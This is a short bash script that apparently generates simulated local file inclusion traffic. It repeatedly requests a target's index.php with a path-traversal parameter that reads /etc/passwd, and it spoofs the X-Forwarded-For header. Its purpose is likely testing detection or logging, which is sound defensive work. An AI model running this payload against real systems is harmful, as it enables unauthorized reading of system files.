#!/bin/bash

TARGET=${TARGET:-http://localhost:8080}

echo "[*] Simulating LFI..."

for i in {1..5}; do
    curl -s -H "X-Forwarded-For: 88.88.88.88" "$TARGET/index.php?page=../../../../etc/passwd" > /dev/null 
done

echo "[*] Finished simulating LFI"